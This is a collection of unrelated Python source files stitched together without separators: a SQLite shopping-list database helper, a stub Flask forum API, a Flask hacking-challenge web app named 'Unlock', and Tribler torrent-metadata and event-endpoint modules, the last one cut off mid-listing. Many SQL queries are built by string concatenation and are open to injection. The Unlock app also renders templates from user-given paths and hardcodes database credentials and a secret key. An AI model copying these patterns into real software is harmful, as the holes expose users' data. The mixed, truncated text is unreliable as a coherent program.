        self.connection.commit()                    

    def remove_item(self, item):  # NOT UPDATED FOR ECOSL II
        """"Remove an item completely"""
        r = self.cursor.execute('delete from items where itemname = "%s"' % item)
        self.connection.commit()                    

    def add_language(self, language):
        """"Add new language for item translations."""
        if self.connection:
            self.cursor.execute('insert into itemlanguage (language) values ("%s")' % language[0])                    
            self.connection.commit()                    

    def add_translation(self, trid):                    
        """Add new translation by item id for an item."""
        if self.connection:
            self.cursor.execute('insert into itemtranslation (itemid, itemlanguageid, translation) values ("%s", "%s", "%s")' % (trid[0], trid[1], trid[2]))                    
            self.connection.commit()                    

    def add_translationname(self, trname):
        """Add new translation by item name for an item."""
        if self.connection:
            for item in self.find_item_name([trname[0], '0']):
                self.cursor.execute('insert into itemtranslation (itemid, itemlanguageid, translation) values ("%s", "%s", "%s")' % (item[0], trname[1], trname[2]))                    
            self.connection.commit()                    


    #
    # Adding, modifying and removing shopping lists

    def add_shoppinglist(self, slist):  # NOT UPDATED FOR ECOSL II
        """"Add a new shoppinglist"""
        t = (slist, )
        self.cursor.execute('insert into lists (listhash) values (?)', t)
        self.connection.commit()                    
        r = self.cursor.execute('select listid, listhash from lists where listhash = "%s"' % slist).fetchall()[0]
        return r

    def update_shoppinglist(self, slistid, slisthash):  # NOT UPDATED FOR ECOSL II
        self.cursor.execute('update lists set listhash = "%s" where listid = "%s"' % (slisthash, slistid))
        self.connection.commit()                    

    def addtolist(self, listhash, itemind, amount):  # NOT UPDATED FOR ECOSL II
        """"Add a given amount of items to shopping list"""
        # get list id
        listid = self.cursor.execute('select listid, listhash from lists where listhash = "%s"' % listhash).fetchall()[0]
        t = (listid[0], itemind, amount)
        self.cursor.execute('insert into listitems (listid, itemid, amount) values (?, ?, ?)', t)
        self.connection.commit()                    
        r = self.cursor.execute('select listitemsid, listid, itemid, amount from listitems where listid="%s" and itemid = "%s"' % (listid[0], itemind)).fetchall()[0]
        return r

    def removefromlist(self, listhash, itemind):  # NOT UPDATED FOR ECOSL II
        """"Remove an item from a shopping list"""
        # get list id
        listid = self.cursor.execute('select listid from lists where listhash = "%s"' % listhash).fetchall()[0]
        print('removing itemind, listid: %s, %s' % (itemind, listid[0]))
        r = self.cursor.execute('delete from listitems where (itemid = "%s" and listid = "%s")' % (itemind, listid[0]))
        self.connection.commit()                    

    def add_store(self, store):                    
        """"Add new store"""                    
        t = (store[0], )                    
        self.cursor.execute('insert into store (name) values (?)', t)                    
        self.connection.commit()                    

    def update_store(self, storeid, storename):  # NOT UPDATED FOR ECOSL II
        self.cursor.execute('update store set storename = "%s" where storeid = "%s"' % (storename, storeid))
        self.connection.commit()                    

    def get_all_stores(self):  # NOT UPDATED FOR ECOSL II
        """"Get all stores"""
        return self.cursor.execute('select storeid, storename from store')

    def get_all_shoppinglists(self):  # NOT UPDATED FOR ECOSL II
        """"Get all shoppinglists"""
        return self.cursor.execute('select listid, listhash from lists')

    def add_price(self, itemid, storeid, price):  # NOT UPDATED FOR ECOSL II
        """"Add a price to an item for a store"""
        r = self.cursor.execute('select priceid, itemid, storeid, price from itemprices where (itemid = %s and storeid = %s)' % (itemid, storeid)).fetchall()
        #print r

        # Check if price for this item in this store exists: if it does, update, if not, insert.
        if r == []:
            #print 'price not found, inserting...'
            t = (itemid, storeid, price)
            self.cursor.execute('insert into itemprices (itemid, storeid, price) values (?, ?, ?)', t)
            self.connection.commit()                    
            #r = self.cursor.execute('select priceid, itemid, storeid, price from itemprices where (itemid = %s and storeid = %s)' % (itemid, storeid)).fetchall()
            #print 'new values:'
            #print r
        else:
            #print 'old (%s) and new (%s) price differ, updating...' % (fetchedprice, price)
            self.cursor.execute('update itemprices set price = "%s" where (itemid = "%s" and storeid = "%s")' % (price, itemid, storeid))
            self.connection.commit()                    
        #return r

    def list_items_in_order(self, storeind):  # NOT UPDATED FOR ECOSL II
        """"List items in correct order for one store"""
        # Currently only thing that connects an item and a store is shoppingorder
        # table.
        r = self.cursor.execute('select shoppingorder.sorder, shoppingorder.storeid, shoppingorder.itemid, store.storeid, store.storename, items.itemid, items.itemname from shoppingorder, store, items where (store.storeid = %s and items.itemid = shoppingorder.itemid and shoppingorder.storeid = store.storeid) order by shoppingorder.sorder' % storeind).fetchall()
        return r

    def list_items_not_in_store(self, storeind):  # NOT UPDATED FOR ECOSL II
        """"List items that do not exist in store"""
        r = self.cursor.execute('select items.itemid, items.itemname from items where items.itemid not in (select shoppingorder.itemid from shoppingorder, store where store.storeid = "%s" and store.storeid = shoppingorder.storeid) order by items.itemname' % storeind).fetchall()
        return r




#
# main function
#

if __name__ == '__main__':
    """"Main function, to be used for creating the database, developing and testing."""

    # Main parser
    ap = argparse.ArgumentParser(epilog='Note: this library does not work yet!')
    ap.add_argument('-d', '--database', nargs=1, metavar='<path/file.db>', required=True, help='The path to the database')
    
    subparsers = ap.add_subparsers(title='Subcommands')

    # Subparser for creating the database
    create_parser = subparsers.add_parser('create', help='subcommand to create a new database or dump the contents to a file.');
    create_parser.add_argument('-e', '--empty', action='store_true', help='Create a new, empty database.')
    create_parser.add_argument('-f', '--file', nargs=1, metavar='<path/file.sql>', dest='inputfile', help='Create a new database and import contents from <path/file.sql>.')
    create_parser.add_argument('-d', '--dump', nargs=1, metavar='<path/file.sql>', dest='dumpfile', help='Create a dump of database contents to <path/file.sql>.')

    # Subparser for adding items
    add_parser = subparsers.add_parser('add', help='subcommands to add items to tables');
    add_parser.add_argument('--item', nargs=2, metavar=('"<name>"', '<list id>'), help='Add new item <name>. <list id> is either a shopping list id or 0, which means the item available for all lists.')
    add_parser.add_argument('--lang', nargs=1, metavar='"<language>"', help='Add new language for item translations.')
    add_parser.add_argument('--trid', nargs=3, metavar=('<item id>', '<language id>', '"<translation>"'), dest='translationid', help='Add new translation for an item <item id> to language <language id>. Translated string is "<translation>".')
    add_parser.add_argument('--trname', nargs=3, metavar=('"<item name>"', '<language id>', '"<translation>"'), dest='translationname', help='Add new translation for an item "<item name>" to language <language id>. Translated string is "<translation>".')
    add_parser.add_argument('--store', nargs=1, metavar='"<store name>"', help='Add new store <store name>.')

    # Subparser for finding and listing table items
    list_parser = subparsers.add_parser('list', help='subcommands for finding and listing database items');
    list_parser.add_argument('--allitems', nargs=1, metavar='<language id>', help='List all available items and their translations for the given language.')
    list_parser.add_argument('--itemname', nargs=2, metavar=('"<item name>"', '<language id>'), help='Find items and their translations by their name for the given language.')
    list_parser.add_argument('--itemid', nargs=2, metavar=('<item id>', '<language id>'), help='Find items and their translations by their ids.')

    args = ap.parse_args()

    print(args) #  debug

    db = EcoDB(args.database[0])


    # Arguments are parsed, do the required tasks.

    # create new, empty database
    if hasattr(args, 'empty'):
        if args.empty:
            db.create_empty_database();

    # dump contents of the database
    if hasattr(args, 'dumpfile'):
        if args.dumpfile:
            db.dump_database(args.dumpfile);

    # create and input contents of the database according to an sql file
    if hasattr(args, 'inputfile'):
        if args.inputfile:
            db.import_database(args.inputfile);

    # add new item
    if hasattr(args, 'item'):
        if args.item:
            db.add_item(args.item)
            #print('new item: %u %s %u' % (index[0], index[1], index[2]))

    # add new translation language
    if hasattr(args, 'lang'):
        if args.lang:
            db.add_language(args.lang)

    # add new translation for an item id
    if hasattr(args, 'translationid'):
        if args.translationid:
            db.add_translation(args.translationid)                    

    # add new translation for an item name
    if hasattr(args, 'translationname'):
        if args.translationname:
            db.add_translationname(args.translationname)
            
    # add new store
    if hasattr(args, 'store'):
        if args.store:
            db.add_store(args.store)

    # list all items and their translations for the given language
    if hasattr(args, 'allitems'):
        if args.allitems:
            for an_item in db.find_all_items(args.allitems):
                print(an_item)

    # list items and their translations by their name for the given language
    if hasattr(args, 'itemname'):
        if args.itemname:
            for an_item in db.find_item_name(args.itemname):
                print(an_item)

    # list items and their translations by their id for the given language
    if hasattr(args, 'itemid'):
        if args.itemid:
            for an_item in db.find_item_id(args.itemid):
                print(an_item)




__author__ = 'vladimir'

from flask import Flask
import ujson

from blueprints.database import FuckingCoolORM                    
from blueprints.forum import forum                    
from blueprints.post import post                    
from blueprints.user import user                    
from blueprints.thread import thread                    


BASE_URL = "/db/api"


app = Flask("db-api")
app.config["DEBUG"] = True

app.register_blueprint(forum, url_prefix=BASE_URL)                    
app.register_blueprint(post, url_prefix=BASE_URL)                    
app.register_blueprint(user, url_prefix=BASE_URL)                    
app.register_blueprint(thread, url_prefix=BASE_URL)                    


@app.route(BASE_URL + "/status", methods=["GET"])
def status():
    res = {
        "forum": FuckingCoolORM.Instance().get_count("forum_t"),                    
        "post": FuckingCoolORM.Instance().get_count("post_t"),                    
        "user": FuckingCoolORM.Instance().get_count("user_t"),                    
        "thread": FuckingCoolORM.Instance().get_count("thread_t"),                    
    }
    return ujson.dumps({"code": 0, "response": res})


def debug_printout():
    res = ""
    for i in app.url_map.iter_rules():
        res += "  {0}\n".format(i)                    
    return "Current routes:\n\n" + res + "\n" + "-"*50


if __name__ == "__main__":
    print debug_printout()
    app.run("127.0.0.1", port=8080)


__author__ = 'vladimir'

import ujson

from flask import Blueprint

BASE_URL = "/forum"                    

forum = Blueprint("forum", __name__)                    


@forum.route(BASE_URL + "/create", methods=["GET"])                    
def create():
    return ujson.dumps({"success": True})

__author__ = 'vladimir'

import ujson

from flask import Blueprint

BASE_URL = "/post"                    

post = Blueprint("post", __name__)                    


@post.route(BASE_URL + "/create", methods=["GET"])                    
def create():
    return ujson.dumps({"success": True})

__author__ = 'vladimir'

import ujson

from flask import Blueprint

BASE_URL = "/thread"                    

thread = Blueprint("thread", __name__)                    


@thread.route(BASE_URL + "/create", methods=["GET"])                    
def create():
    return ujson.dumps({"success": True})

__author__ = 'vladimir'

import ujson

from flask import Blueprint

BASE_URL = "/user"                    

user = Blueprint("user", __name__)                    


@user.route(BASE_URL + "/create", methods=["GET"])                    
def create():
    return ujson.dumps({"success": True})

#!/usr/bin/env python
from flask import Flask, render_template, request, redirect, url_for
from flask_login import LoginManager, login_user, current_user, logout_user, login_required
from flask_sqlalchemy import SQLAlchemy, sqlalchemy
from flask.ext.socketio import emit, SocketIO
import os, uuid, psycopg2

app = Flask(__name__, template_folder='pages')
login_manager = LoginManager()
login_manager.init_app(app);
app.config["SQLALCHEMY_DATABASE_URI"] = "postgresql://ubuntu:Unl0ck@localhost/unlock"
app.config["SECRET_KEY"] = "something unique and secret"
db = SQLAlchemy(app)
socketIO = SocketIO(app)
url_prefix = "https://capstone-brocksmith225.c9users.io/"






#-----USER ACCOUNT SET-UP-----#
class User(db.Model):
    
    __tablename__ = "unlock_users"
    
    email = db.Column(db.String(40), unique=True, primary_key=True)
    pwd = db.Column(db.String(64))
    progress = db.Column(db.Integer, default=1)
    level1_progress = db.Column(db.Integer, default=0)
    level2_progress = db.Column(db.Integer, default=0)
    level3_progress = db.Column(db.Integer, default=0)
    level4_progress = db.Column(db.Integer, default=0)
    authenticated = db.Column(db.Boolean, default=False)
    difficulty = db.Column(db.Integer, default=0)

    def is_active(self):
        return True
    
    def is_authenticated(self):
        return self.authenticated
        
    def is_anonymous(self):
        return False
    
    def get_id(self):
        return self.email
        
    @staticmethod
    def get(user_id):
        return 1
        
class BMailUser(db.Model):
    
    __tablename__ = "bmail_users"
    
    account = db.Column(db.String(40), unique=True, primary_key=True)
    pwd = db.Column(db.String(64))

    def is_active(self):
        return True
    
    def is_authenticated(self):
        return self.authenticated
        
    def is_anonymous(self):
        return False
    
    def get_id(self):
        return self.account
        
    @staticmethod
    def get(user_id):
        return 1
        
db.create_all()
db.session.commit()

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(user_id)
#-----END USER ACCOUNT FUNCTIONALITY-----#
    
    
    


#-----BASE WEBSITE FUNCTIONALITY-----#
@app.route("/")
def opening():
    try:
        if current_user.is_authenticated():
            return render_template("menu.html", progress=current_user.progress, level1_progress=current_user.level1_progress, level2_progress=current_user.level2_progress, level3_progress=current_user.level3_progress, level4_progress=current_user.level4_progress)
        return render_template("opening.html")
    except Exception:
        pass
    return render_template("opening.html")
    
@app.route("/create-account", methods=["POST"])
def createAccount():
    pwd = request.form["password"]
    email = request.form["email"]
    difficulty = request.form["difficulty"]
    user = User(email=email, pwd=pwd, difficulty=difficulty)
    db_user = User.query.get(email)
    if db_user:
        return render_template("login.html", success=False)
    user.authenticated = True
    db.session.add(user)
    db.session.commit()
    login_user(user, remember=True)
    return redirect(url_prefix)
    
@app.route("/login", methods=["POST"])
def login():
    user = User.query.get(request.form["email"])
    if user:
        if request.form["password"] == user.pwd:
            user.authenticated = True
            db.session.add(user)
            db.session.commit()
            login_user(user, remember=True)
            return redirect(url_prefix)
    return render_template("unsuccessful-login.html")
    
@app.route("/tutorial")
@login_required
def tutorial():
    return ""

@app.route("/logout")
def logout():
    user = current_user
    user.authenticated = False
    db.session.add(user)
    db.session.commit()
    logout_user()
    return "logged out"
#-----END BASE WEBSITE FUNCTIONALITY-----#

   



#-----UI FUNCTIONALITY-----#
@app.route("/level-1")
@login_required
def level1():
    if int(current_user.progress) >= 1:
        return render_template("ui.html", level="1", page="index", level_progress=current_user.level1_progress, max_level_progress=3)
    return redirect(url_prefix)
    
@app.route("/level-2")
@login_required
def level2():
    if int(current_user.progress) >= 2:
        return render_template("ui.html", level="2", page="index", level_progress=current_user.level2_progress, max_level_progress=4)
    return redirect(url_prefix)
    
@app.route("/level-3")
@login_required
def level3():
    if int(current_user.progress) >= 3:
        return render_template("ui.html", level="3", page="index", level_progress=current_user.level3_progress, max_level_progress=3)
    return redirect(url_prefix)
    
@app.route("/level-4")
@login_required
def level4():
    if int(current_user.progress) >= 4:
        return render_template("ui.html", level="4", page="index", level_progress=current_user.level4_progress, max_level_progress=3)
    return redirect(url_prefix)

@app.route("/flag-check/<level>", methods=["POST"])
def flagCheck(level):
    conn = psycopg2.connect("dbname=unlock user=ubuntu")                    
    cur = conn.cursor()
    cur.execute("SELECT * FROM unlock_flags WHERE level=" + level + ";")
    res = cur.fetchone()
    cur.close()
    conn.close()
    if str(request.form["flag"]) == str(res[1]):
        if int(current_user.level1_progress) <= 2:
            current_user.level1_progress = 3
        if int(current_user.progress) <= 1:
            current_user.progress = 2
        db.session.commit()
        return "true"
    return "false"
    
@app.route("/get-hint/<level>", methods=["POST"])
def getHint(level):
    conn = psycopg2.connect("dbname=unlock user=ubuntu")                    
    cur = conn.cursor()
    if int(level) == 1:
        cur.execute("SELECT hint FROM unlock_hints WHERE level=1 AND progress=" + str(current_user.level1_progress) + " AND difficulty=" + str(current_user.difficulty) +";")
        res = cur.fetchone()
    elif int(level) == 2:
        cur.execute("SELECT hint FROM unlock_hints WHERE level=2 AND progress=" + str(current_user.level2_progress) + " AND difficulty=" + str(current_user.difficulty) +";")
        res = cur.fetchone()
    elif int(level) == 3:
        cur.execute("SELECT hint FROM unlock_hints WHERE level=3 AND progress=" + str(current_user.level3_progress) + " AND difficulty=" + str(current_user.difficulty) +";")
        res = cur.fetchone()
    elif int(level) == 4:
        cur.execute("SELECT hint FROM unlock_hints WHERE level=4 AND progress=" + str(current_user.level4_progress) + " AND difficulty=" + str(current_user.difficulty) +";")
        res = cur.fetchone()
    cur.close()
    conn.close()
    return str(res[0])
#-----END UI FUNCTIONALITY-----#

    
    
    
    
#-----FIRST LEVEL FUNCTIONALITY-----#
@app.route("/level-1/index")
@login_required
def level1Index():
    socketIO.emit("level-progress-update", {"level_progress" : "test"})
    return render_template("level-1/index.html")

@app.route("/level-1/create-account", methods=["POST"])
@login_required
def level1CreateAccount():
    pwd = request.form["password"]
    account = request.form["account"]
    user = BMailUser(account=account, pwd=pwd)
    db_user = BMailUser.query.get(account)
    if db_user:
        return redirect(url_prefix + "level-1/index")
    db.session.add(user)
    db.session.commit()
    if int(current_user.level1_progress) <= 0:
        current_user.level1_progress = 1
        db.session.commit()
    return redirect(url_prefix + "level-1/inbox?account=" + user.account)

@app.route("/level-1/login", methods=["POST"])
@login_required
def level1Login():
    user = BMailUser.query.get(request.form["account"])
    if user:
        if request.form["password"] == user.pwd:
            if int(current_user.level1_progress) <= 1 and str(request.form["account"]) == "dev.team":
                current_user.level1_progress = 2
                db.session.commit()
            return redirect(url_prefix + "level-1/inbox?account=" + user.account)
    return redirect(url_prefix + "level-1/index")

@app.route("/level-1/inbox")
@login_required
def level1Inbox():
    conn = psycopg2.connect("dbname=unlock user=ubuntu")                    
    cur = conn.cursor()
    cur.execute("SELECT * FROM bmail_emails;")
    res = cur.fetchall()
    cur.close()
    conn.close()
    emails = [dict() for x in range(len(res))]
    account = request.args.get("account")
    for i in range(len(res)-1, -1, -1):
        if res[i][4] == account:
            emails[i]["title"] = res[i][0]
            emails[i]["body"] = res[i][1]
            emails[i]["sender"] = res[i][2]
            emails[i]["tags"] = res[i][3]
    return render_template("level-1/inbox.html", account=account, emails=emails, count=len(emails))

@app.route("/level-1/<page>")
@login_required
def level1Subpage(page):
    return render_template("level-1/" + page + ".html")
    
@app.route("/level-1/info")
@login_required
def info():
    if int(current_user.progress) > 1:
        return render_template("info-pages/level-1.html")
    return redirect("/")
#-----END FIRST LEVEL FUNCTIONALITY-----#

    
    
    

#-----SECOND LEVEL FUNCTIONALITY-----#
@app.route("/level-2/index")
@login_required
def level2Index():
    conn = psycopg2.connect("dbname=unlock user=ubuntu")                    
    cur = conn.cursor()
    cur.execute("SELECT * FROM nile_items;")                    
    res = cur.fetchall()
    cur.close()
    conn.close()
    items = [dict() for x in range(len(res))]
    for i in range(len(res)-1, -1, -1):
        items[i]["name"] = res[i][0]                    
        items[i]["price"] = res[i][1]                    
        items[i]["image"] = res[i][2]                    
    return render_template("level-2/index.html", items=items, count=len(items))

@app.route("/level-2/search", methods=["POST"])
@login_required
def level2Search():
    term = str(request.form["term"])
    conn = psycopg2.connect("dbname=unlock user=ubuntu")                    
    cur = conn.cursor()
    cur.execute("SELECT * FROM nile_items;")                    
    res = cur.fetchall()
    cur.close()
    conn.close()
    items = [dict() for x in range(len(res))]
    for i in range(len(res)-1, -1, -1):
        if term in res[i][0] or term in res[i][3]:                    
            items[i]["name"] = res[i][0]                    
            items[i]["price"] = res[i][1]                    
            items[i]["image"] = res[i][2]                    
    return str(items)

@app.route("/level-2/<page>")
@login_required
def level2Subpage(page):
    return render_template("level-2/" + page + ".html")
#-----END SECOND LEVEL FUNCTIONALITY-----#





#-----SCREENSHOT FUNCTIONALITY-----#
@app.route("/screenshot/<page>")
@login_required
def screenshot(page):
    if current_user.email == "brocksmith225@gmail.com":
        return render_template(page + ".html")
    return redirect(url_prefix)

@app.route("/screenshot/<folder>/<page>")
@login_required
def screenshot2(folder, page):
    if current_user.email == "brocksmith225@gmail.com":
        return render_template(folder + "/" + page + ".html")
    return redirect(url_prefix)
#-----END SCREENSHOT FUNCTIONALITY-----#





app.run(host="0.0.0.0", port=8080, debug=True)
socketIO.run(app)

from __future__ import absolute_import

from binascii import hexlify
from datetime import datetime

from pony import orm
from pony.orm import db_session, desc, raw_sql, select

from Tribler.Core.Category.FamilyFilter import default_xxx_filter
from Tribler.Core.Modules.MetadataStore.OrmBindings.channel_node import LEGACY_ENTRY, TODELETE
from Tribler.Core.Modules.MetadataStore.serialization import REGULAR_TORRENT, TorrentMetadataPayload
from Tribler.Core.Utilities.tracker_utils import get_uniformed_tracker_url
from Tribler.pyipv8.ipv8.database import database_blob


def define_binding(db):
    class TorrentMetadata(db.ChannelNode):
        _discriminator_ = REGULAR_TORRENT

        # Serializable
        infohash = orm.Required(database_blob)
        size = orm.Optional(int, size=64, default=0)
        torrent_date = orm.Optional(datetime, default=datetime.utcnow)
        title = orm.Optional(str, default='')
        tags = orm.Optional(str, default='')
        tracker_info = orm.Optional(str, default='')

        orm.composite_key(db.ChannelNode.public_key, infohash)

        # Local
        xxx = orm.Optional(float, default=0)
        health = orm.Optional('TorrentState', reverse='metadata')

        _payload_class = TorrentMetadataPayload

        def __init__(self, *args, **kwargs):
            if "health" not in kwargs and "infohash" in kwargs:
                kwargs["health"] = db.TorrentState.get(infohash=kwargs["infohash"]) or db.TorrentState(
                    infohash=kwargs["infohash"])
            if 'xxx' not in kwargs:
                kwargs["xxx"] = default_xxx_filter.isXXXTorrentMetadataDict(kwargs)

            super(TorrentMetadata, self).__init__(*args, **kwargs)

            if 'tracker_info' in kwargs:
                self.add_tracker(kwargs["tracker_info"])

        def add_tracker(self, tracker_url):
            sanitized_url = get_uniformed_tracker_url(tracker_url)
            if sanitized_url:
                tracker = db.TrackerState.get(url=sanitized_url) or db.TrackerState(url=sanitized_url)
                self.health.trackers.add(tracker)

        def before_update(self):
            self.add_tracker(self.tracker_info)

        def get_magnet(self):
            return ("magnet:?xt=urn:btih:%s&dn=%s" %
                    (str(self.infohash).encode('hex'), self.title)) + \
                   ("&tr=%s" % self.tracker_info if self.tracker_info else "")

        @classmethod
        def search_keyword(cls, query, lim=100):
            # Requires FTS5 table "FtsIndex" to be generated and populated.
            # FTS table is maintained automatically by SQL triggers.
            # BM25 ranking is embedded in FTS5.

            # Sanitize FTS query
            if not query or query == "*":
                return []

            fts_ids = raw_sql(
                'SELECT rowid FROM FtsIndex WHERE FtsIndex MATCH $query ORDER BY bm25(FtsIndex) LIMIT $lim')
            return cls.select(lambda g: g.rowid in fts_ids)

        @classmethod
        def get_auto_complete_terms(cls, keyword, max_terms, limit=10):
            if not keyword:
                return []

            with db_session:
                result = cls.search_keyword("\"" + keyword + "\"*", lim=limit)[:]
            titles = [g.title.lower() for g in result]

            # Copy-pasted from the old DBHandler (almost) completely
            all_terms = set()
            for line in titles:
                if len(all_terms) >= max_terms:
                    break
                i1 = line.find(keyword)
                i2 = line.find(' ', i1 + len(keyword))
                term = line[i1:i2] if i2 >= 0 else line[i1:]
                if term != keyword:
                    all_terms.add(term)
            return list(all_terms)

        @classmethod
        @db_session
        def get_random_torrents(cls, limit):
            """
            Return some random torrents from the database.
            """
            return TorrentMetadata.select(
                lambda g: g.metadata_type == REGULAR_TORRENT and g.status != LEGACY_ENTRY).random(limit)

        @classmethod
        @db_session
        def get_entries_query(cls, sort_by=None, sort_asc=True, query_filter=None):
            """
            Get some metadata entries. Optionally sort the results by a specific field, or filter the channels based
            on a keyword/whether you are subscribed to it.
            :return: A tuple. The first entry is a list of ChannelMetadata entries. The second entry indicates
                     the total number of results, regardless the passed first/last parameter.
            """
            # Warning! For Pony magic to work, iteration variable name (e.g. 'g') should be the same everywhere!
            # Filter the results on a keyword or some keywords
            pony_query = cls.search_keyword(query_filter, lim=1000) if query_filter else select(g for g in cls)

            # Sort the query
            if sort_by:
                if sort_by == "HEALTH":
                    pony_query = pony_query.sort_by("(g.health.seeders, g.health.leechers)") if sort_asc else \
                        pony_query.sort_by("(desc(g.health.seeders), desc(g.health.leechers))")
                else:
                    sort_expression = "g." + sort_by
                    sort_expression = sort_expression if sort_asc else desc(sort_expression)
                    pony_query = pony_query.sort_by(sort_expression)
            return pony_query


        @classmethod
        @db_session
        def get_entries(cls, first=None, last=None, metadata_type=REGULAR_TORRENT, channel_pk=False,
                        exclude_deleted=False, hide_xxx=False, **kwargs):                    
            """
            Get some torrents. Optionally sort the results by a specific field, or filter the channels based
            on a keyword/whether you are subscribed to it.
            :return: A tuple. The first entry is a list of ChannelMetadata entries. The second entry indicates
                     the total number of results, regardless the passed first/last parameter.
            """
            pony_query = cls.get_entries_query(**kwargs)

            if isinstance(metadata_type, list):
                pony_query = pony_query.where(lambda g: g.metadata_type in metadata_type)
            else:
                pony_query = pony_query.where(metadata_type=metadata_type)

            if exclude_deleted:
                pony_query = pony_query.where(lambda g: g.status != TODELETE)
            if hide_xxx:
                pony_query = pony_query.where(lambda g: g.xxx == 0)

            # Filter on channel
            if channel_pk:
                pony_query = pony_query.where(public_key=channel_pk)

            count = pony_query.count()

            return pony_query[(first or 1) - 1:last] if first or last else pony_query, count

        @db_session
        def to_simple_dict(self, include_trackers=False):
            """
            Return a basic dictionary with information about the channel.
            """
            simple_dict = {
                "id": self.rowid,
                "name": self.title,
                "infohash": hexlify(self.infohash),
                "size": self.size,
                "category": self.tags,
                "num_seeders": self.health.seeders,
                "num_leechers": self.health.leechers,
                "last_tracker_check": self.health.last_check,
                "status": self.status
            }

            if include_trackers:
                simple_dict['trackers'] = [tracker.url for tracker in self.health.trackers]

            return simple_dict

        def metadata_conflicting(self, b):
            # Check if metadata in the given dict has conflicts with this entry
            # WARNING! This does NOT check the INFOHASH
            a = self.to_dict()
            for comp in ["title", "size", "tags", "torrent_date", "tracker_info"]:
                if (comp not in b) or (str(a[comp]) == str(b[comp])):
                    continue
                return True
            return False

    return TorrentMetadata

from __future__ import absolute_import

import time
from binascii import hexlify

from twisted.web import resource, server

import Tribler.Core.Utilities.json_util as json
from Tribler.Core.Modules.restapi.util import fix_unicode_dict
from Tribler.Core.simpledefs import NTFY_CHANNEL, NTFY_CREDIT_MINING, NTFY_DISCOVERED, NTFY_ERROR, NTFY_FINISHED, \                    
    NTFY_INSERT, NTFY_MARKET_ON_ASK, NTFY_MARKET_ON_ASK_TIMEOUT, NTFY_MARKET_ON_BID, NTFY_MARKET_ON_BID_TIMEOUT, \                    
    NTFY_MARKET_ON_PAYMENT_RECEIVED, NTFY_MARKET_ON_PAYMENT_SENT, NTFY_MARKET_ON_TRANSACTION_COMPLETE, \                    
    NTFY_NEW_VERSION, NTFY_REMOVE, NTFY_STARTED, NTFY_TORRENT, NTFY_TRIBLER, NTFY_TUNNEL, NTFY_UPDATE, NTFY_UPGRADER, \                    
    NTFY_UPGRADER_TICK, NTFY_WATCH_FOLDER_CORRUPT_TORRENT, SIGNAL_LOW_SPACE, SIGNAL_RESOURCE_CHECK, STATE_SHUTDOWN                    
from Tribler.Core.version import version_id
from Tribler.pyipv8.ipv8.messaging.anonymization.tunnel import Circuit


class EventsEndpoint(resource.Resource):
    """
    Important events in Tribler are returned over the events endpoint. This connection is held open. Each event is
    pushed over this endpoint in the form of a JSON dictionary. Each JSON dictionary contains a type field that
    indicates the type of the event. Individual events are separated by a newline character (\n).

    Currently, the following events are implemented:

    - events_start: An indication that the event socket is opened and that the server is ready to push events. This
      includes information about whether Tribler has started already or not and the version of Tribler used.
    - search_result_channel: This event dictionary contains a search result with a channel that has been found.
    - search_result_torrent: This event dictionary contains a search result with a torrent that has been found.
    - upgrader_started: An indication that the Tribler upgrader has started.
    - upgrader_finished: An indication that the Tribler upgrader has finished.
    - upgrader_tick: An indication that the state of the upgrader has changed. The dictionary contains a human-readable
      string with the new state.
    - watch_folder_corrupt_torrent: This event is emitted when a corrupt .torrent file in the watch folder is found.
      The dictionary contains the name of the corrupt torrent file.
    - new_version_available: This event is emitted when a new version of Tribler is available.
    - tribler_started: An indicator that Tribler has completed the startup procedure and is ready to use.
    - channel_discovered: An indicator that Tribler has discovered a new channel. The event contains the name,
      description and dispersy community id of the discovered channel.
    - torrent_discovered: An indicator that Tribler has discovered a new torrent. The event contains the infohash, name,
      list of trackers, list of files with name and size, and the dispersy community id of the discovered torrent.
    - torrent_removed_from_channel: An indicator that a torrent has been removed from a channel. The event contains
      the infohash and the dispersy id of the channel which contained the removed torrent.
    - torrent_finished: A specific torrent has finished downloading. The event includes the infohash and name of the
      torrent that has finished downloading.
    - torrent_error: An error has occurred during the download process of a specific torrent. The event includes the
      infohash and a readable string of the error message.
    - tribler_exception: An exception has occurred in Tribler. The event includes a readable string of the error.
    - market_ask: Tribler learned about a new ask in the market. The event includes information about the ask.
    - market_bid: Tribler learned about a new bid in the market. The event includes information about the bid.
    - market_ask_timeout: An ask has expired. The event includes information about the ask.
    - market_bid_timeout: An bid has expired. The event includes information about the bid.
    - market_transaction_complete: A transaction has been completed in the market. The event contains the transaction
      that was completed.
    - market_payment_received: We received a payment in the market. The events contains the payment information.
    - market_payment_sent: We sent a payment in the market. The events contains the payment information.
    - market_iom_input_required: The Internet-of-Money modules requires user input (like a password or challenge
      response).
    """

    def __init__(self, session):
        resource.Resource.__init__(self)
        self.session = session
        self.events_requests = []

        self.infohashes_sent = set()
        self.channel_cids_sent = set()

        self.session.add_observer(self.on_upgrader_started, NTFY_UPGRADER, [NTFY_STARTED])
        self.session.add_observer(self.on_upgrader_finished, NTFY_UPGRADER, [NTFY_FINISHED])
        self.session.add_observer(self.on_upgrader_tick, NTFY_UPGRADER_TICK, [NTFY_STARTED])
        self.session.add_observer(self.on_watch_folder_corrupt_torrent,
                                  NTFY_WATCH_FOLDER_CORRUPT_TORRENT, [NTFY_INSERT])
        self.session.add_observer(self.on_new_version_available, NTFY_NEW_VERSION, [NTFY_INSERT])
        self.session.add_observer(self.on_tribler_started, NTFY_TRIBLER, [NTFY_STARTED])
        self.session.add_observer(self.on_channel_discovered, NTFY_CHANNEL, [NTFY_DISCOVERED])
        self.session.add_observer(self.on_torrent_discovered, NTFY_TORRENT, [NTFY_DISCOVERED])
        self.session.add_observer(self.on_torrent_finished, NTFY_TORRENT, [NTFY_FINISHED])
        self.session.add_observer(self.on_torrent_error, NTFY_TORRENT, [NTFY_ERROR])
        self.session.add_observer(self.on_torrent_info_updated, NTFY_TORRENT, [NTFY_UPDATE])
        self.session.add_observer(self.on_market_ask, NTFY_MARKET_ON_ASK, [NTFY_UPDATE])
        self.session.add_observer(self.on_market_bid, NTFY_MARKET_ON_BID, [NTFY_UPDATE])
        self.session.add_observer(self.on_market_ask_timeout, NTFY_MARKET_ON_ASK_TIMEOUT, [NTFY_UPDATE])
        self.session.add_observer(self.on_market_bid_timeout, NTFY_MARKET_ON_BID_TIMEOUT, [NTFY_UPDATE])
        self.session.add_observer(self.on_market_transaction_complete,
                                  NTFY_MARKET_ON_TRANSACTION_COMPLETE, [NTFY_UPDATE])
        self.session.add_observer(self.on_market_payment_received, NTFY_MARKET_ON_PAYMENT_RECEIVED, [NTFY_UPDATE])
